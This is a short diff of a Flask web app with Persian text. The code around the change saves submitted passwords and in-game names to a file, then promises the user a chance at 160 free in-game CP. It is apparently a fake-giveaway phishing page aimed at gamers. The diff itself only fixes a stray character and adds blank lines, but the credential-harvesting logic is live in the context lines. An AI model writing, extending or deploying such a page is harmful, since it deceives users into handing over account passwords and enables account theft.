@@ -35,9 +35,11 @@ def submit():
         f.write(f"رمز عبور: {password}\n")
         f.write(f"نام در بازی: {gamename}\n")
 
-    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")و
+    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+
 
